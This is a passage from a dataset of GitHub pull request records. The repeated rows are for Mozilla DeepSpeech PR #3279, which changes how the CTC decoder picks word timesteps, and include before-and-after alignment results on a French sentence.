 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04a36fbf68b218199667b1b915f12cbcf884d925,"The CTC decoder timesteps now corresponds to the timesteps of the most
probable CTC path, instead of the earliest timesteps of all possible paths."
555,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3d6f8d9230d08b430a2da598b67d6ec41ebdd94,PR #3279 - replaced tabulations by spaces
556,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((145, 155),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((158, 185),)),
 WordScoreRange(word=de /de/, score=None, ranges=((189, 192),)),  
 WordScoreRange(word=l'hiver /l'hiver/, score=None, ranges=((194, 212),)),
 WordScoreRange(word=et /et/, score=None, ranges=((214, 216),)),                                                               
 WordScoreRange(word=la /la/, score=None, ranges=((219, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((224, 239),)),                                                                                                                         
 WordScoreRange(word=de /de/, score=None, ranges=((241, 244),)),            
 WordScoreRange(word=la /la/, score=None, ranges=((246, 248),)),              
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((250, 258),)),
 WordScoreRange(word=du /du/, score=None, ranges=((259, 262),)),            
 WordScoreRange(word=monde /monde/, score=None, ranges=((264, 272),)),
 WordScoreRange(word=de //, score=None, ranges=((273, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((278, 289),)),
 WordScoreRange(word=les /les/, score=None, ranges=((295, 299),)),
 WordScoreRange(word=images /images/, score=None, ranges=((303, 318),)),
 WordScoreRange(word=de /de/, score=None, ranges=((321, 323),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((327, 362),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((375, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((398, 403),)),
 WordScoreRange(word=place /place/, score=None, ranges=((409, 424),)),
 WordScoreRange(word=de /de/, score=None, ranges=((430, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((437, 448),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((450, 456),)),
 WordScoreRange(word=les /les/, score=None, ranges=((458, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((465, 479),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((487, 507),)),
 WordScoreRange(word=de /de/, score=None, ranges=((509, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((513, 519),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((521, 533),)),
 WordScoreRange(word=télévisés /télévisés/, score=None, ranges=((535, 562),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((568, 576),)),
 WordScoreRange(word=épreuves /épreuves/, score=None, ranges=((581, 618),)),
 WordScoreRange(word=aujourd'hui /aujourd'hui/, score=None, ranges=((629, 654),)),
 WordScoreRange(word=on /onoro/, score=None, ranges=((662, 680),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 761),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((768, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((808, 820),)),
 WordScoreRange(word=de /de/, score=None, ranges=((822, 824),)),
 WordScoreRange(word=la /l/, score=None, ranges=((826, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((833, 842),)),
 WordScoreRange(word=du /d/, score=None, ranges=((843, 846),)),
 WordScoreRange(word=monde /mond/, score=None, ranges=((850, 858),))]
```

We can see that before this PR, there are 17 words where timesteps are too early (about one letter shift, it is visible at the end but not at the begining of words because I have trimed spaces).
After this PR, the fit is almost prefect. For some reason, there are still 3 remaining errors, all in the 4 last words.",godefv,18540039,2020-08-25T11:03:55Z,COLLABORATOR,True,277,31,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,78c4ef17b11fe681702cb0619a0b938a0b59f5bd,PR #3279 - removed unrelated code
557,https://api.github.com/repos/mozilla/DeepSpeech/pulls/3279,3279,"The CTC decoder timesteps now corresponds to the timesteps of the most probable CTC path, instead of the earliest timesteps of all possible paths.","This follows the issue #3180 .

I suggest a new way of handling timesteps produced by the CTC decoder. There is no strange heuristic, and I think the logic is clear : when fusing two different paths leading to the same prefix, not only fuse the probabilities (the probabilities are added), but also fuse the timestep sequences (for the last letter in the sequence, choose the timestep from the most probable path).

The place where two different paths leading to the same prefix are fused are the places where `log_sum_exp` is called, because this function fuses the probabilities. So, timesteps would now be fused at the same places.

The other change is that each `PathTrie` node would now store the full sequence of timesteps. This is because one prefix can be an ancestor of another and their timesteps on a given node can differ. Having the full sequence of timesteps in each node, we have no need to duplicate a node with different timesteps, and it is much simpler like that. 
Moreover, it makes sense to store the *full* sequence of timesteps, because the *combined* probabilities are also stored there. The total probability is not the sum of the probability of each output token, and, in the same way, the correct sequence of timesteps is not the concatenation of the timestep of each output token.

Since I need to compare the probability of different paths (to keep the timesteps of the most probable one), it is important to compare paths of the same length (eg. paths from the beginning up to the current time). So, exactly the same way as it is done for the probabilities, I need to know the timesteps of the previous time, and store the timesteps of the current time separately.

In the end, timesteps are handled in a way very similar to the way probabilities are handled.

### Results on an example
To evaluate the resulting timesteps, I first take the argmax of my logits. In my example, it gives :
```
tou_________________________________________________ss  les  _a__mouurreuux  de  se_p_ort__ diiivverrr_  ss'enn__ _r_é___j_uuii__rr__on_t____    aa_v_eecc_   l''aap__p_rroo___chhee_____    de_  ll'hhi__v_e_rr____  et   la   rre__p_rri_ssee  dee  la  c_ouppee ddu  mon_deee      ss__kk_i___      less    ii_mm_a__ggees_   de   _g_ll_i_ss__ssee____________________             ree__t_rrou_vveennt    uunee    __pllaa___cee____      de    _cchhooixx__  d_ans_  lles  _pp_a____ggeess        ssspp_o_r_t_ii_vees_  de  v_o_s_ _jourrnnaauxx  ttéé_l_é___v_ii___ss_é__s__      ddeeu_x_   __é___pprreeuu_vvees___________________          _auu_jjoouurrdd''hhuuii___       _o____nno___rr_o_____d__a___mm________ ___s___a_n______t__a______  _q__a___tt__e___rr_i____n__a_____     __p_r____mmie_r__  s__a___l__o___m___    _g_é____ant__  de   lla  _c_ou_ppee  ddu   m_on___deee____________________________________________________
```
As the logits are the only input of the decoder, I base my evaluation on them instead of comparing with the audio file directly. It is known that the CTC loss does not guarantee alignment between the audio file and the logits, so the best thing the decoder can do is to fit the logits as best as it can. This is reasonable because, in practice, the logits are aligned quite well with the audio file.

Then, for each word, I take the part of the logits corresponding to the output timesteps, take the argmax (as said above), and print the corresponding decoded text. 

Finally, I assume that good timesteps should lead to a good match between the word and its corresponding text decoded from the argmax of the logits.

Before this PR, the result in my example is (text between slashes is from the logits argmax, spaces are trimmed) : 
```
[WordScoreRange(word=tous /tou/, score=None, ranges=((0, 4),)),   
 WordScoreRange(word=les /les/, score=None, ranges=((55, 59),)),       
 WordScoreRange(word=amoureux /amoureu/, score=None, ranges=((60, 74),)),
 WordScoreRange(word=de /d/, score=None, ranges=((75, 78),)),           
 WordScoreRange(word=sport /seport/, score=None, ranges=((80, 90),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((91, 102),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((103, 111),)),  
 WordScoreRange(word=réjouiront /réjuiron/, score=None, ranges=((112, 136),)),
 WordScoreRange(word=avec /avec/, score=None, ranges=((141, 153),)),  
 WordScoreRange(word=l'approche /l'approche/, score=None, ranges=((155, 179),)),
 WordScoreRange(word=de /de/, score=None, ranges=((185, 191),)),  
 WordScoreRange(word=l'hiver /l'hive/, score=None, ranges=((192, 206),)),
 WordScoreRange(word=et /e/, score=None, ranges=((208, 215),)),
 WordScoreRange(word=la /la/, score=None, ranges=((217, 221),)),
 WordScoreRange(word=reprise /reprise/, score=None, ranges=((222, 238),)),
 WordScoreRange(word=de /de/, score=None, ranges=((240, 243),)),
 WordScoreRange(word=la /la/, score=None, ranges=((244, 248),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((249, 257),)),
 WordScoreRange(word=du /d/, score=None, ranges=((258, 261),)),
 WordScoreRange(word=monde /monde/, score=None, ranges=((263, 270),)),
 WordScoreRange(word=de /e/, score=None, ranges=((271, 275),)),
 WordScoreRange(word=ski /ski/, score=None, ranges=((276, 286),)),
 WordScoreRange(word=les /les/, score=None, ranges=((290, 298),)),
 WordScoreRange(word=images /image/, score=None, ranges=((300, 316),)),
 WordScoreRange(word=de /d/, score=None, ranges=((318, 322),)),
 WordScoreRange(word=glisse /glisse/, score=None, ranges=((324, 341),)),
 WordScoreRange(word=retrouvent /retrouvent/, score=None, ranges=((363, 394),)),
 WordScoreRange(word=une /une/, score=None, ranges=((395, 402),)),
 WordScoreRange(word=place /place/, score=None, ranges=((404, 419),)),
 WordScoreRange(word=de /de/, score=None, ranges=((425, 432),)),
 WordScoreRange(word=choix /choix/, score=None, ranges=((433, 445),)),
 WordScoreRange(word=dans /dans/, score=None, ranges=((448, 455),)),
 WordScoreRange(word=les /les/, score=None, ranges=((457, 462),)),
 WordScoreRange(word=pages /pages/, score=None, ranges=((463, 478),)),
 WordScoreRange(word=sportives /sportives/, score=None, ranges=((479, 506),)),
 WordScoreRange(word=de /de/, score=None, ranges=((508, 511),)),
 WordScoreRange(word=vos /vos/, score=None, ranges=((512, 518),)),
 WordScoreRange(word=journaux /journaux/, score=None, ranges=((520, 532),)),
 WordScoreRange(word=télévisés /télévisé/, score=None, ranges=((533, 559),)),
 WordScoreRange(word=deux /deux/, score=None, ranges=((563, 575),)),
 WordScoreRange(word=épreuves /épreuve/, score=None, ranges=((577, 598),)),
 WordScoreRange(word=aujourd'hui /aujourd'hu/, score=None, ranges=((618, 649),)),
 WordScoreRange(word=on /o/, score=None, ranges=((654, 665),)),
 WordScoreRange(word=a /am/, score=None, ranges=((685, 699),)),
 WordScoreRange(word=santa /santa/, score=None, ranges=((703, 726),)),
 WordScoreRange(word=caterina /qaterina/, score=None, ranges=((729, 756),)),
 WordScoreRange(word=premier /prmier/, score=None, ranges=((762, 783),)),
 WordScoreRange(word=salon /salom/, score=None, ranges=((785, 803),)),
 WordScoreRange(word=géant /géant/, score=None, ranges=((805, 818),)),
 WordScoreRange(word=de /d/, score=None, ranges=((819, 823),)),
 WordScoreRange(word=la /l/, score=None, ranges=((825, 829),)),
 WordScoreRange(word=coupe /coupe/, score=None, ranges=((831, 841),)),
 WordScoreRange(word=du /d/, score=None, ranges=((842, 846),)),
 WordScoreRange(word=monde /mon/, score=None, ranges=((848, 857),))]
```

After this PR, the result in my example is : 
```
[WordScoreRange(word=tous /tous/, score=None, ranges=((0, 54),)), 
 WordScoreRange(word=les /les/, score=None, ranges=((56, 59),)),        
 WordScoreRange(word=amoureux /amoureux/, score=None, ranges=((62, 75),)),
 WordScoreRange(word=de /de/, score=None, ranges=((77, 79),)),          
 WordScoreRange(word=sport /seport/, score=None, ranges=((81, 91),)),           
 WordScoreRange(word=divers /diver/, score=None, ranges=((92, 103),)),
 WordScoreRange(word=s'en /s'en/, score=None, ranges=((105, 113),)),  
 WordScoreRange(word=réjouiront /réjuiront/, score=None, ranges=((114, 140),)),
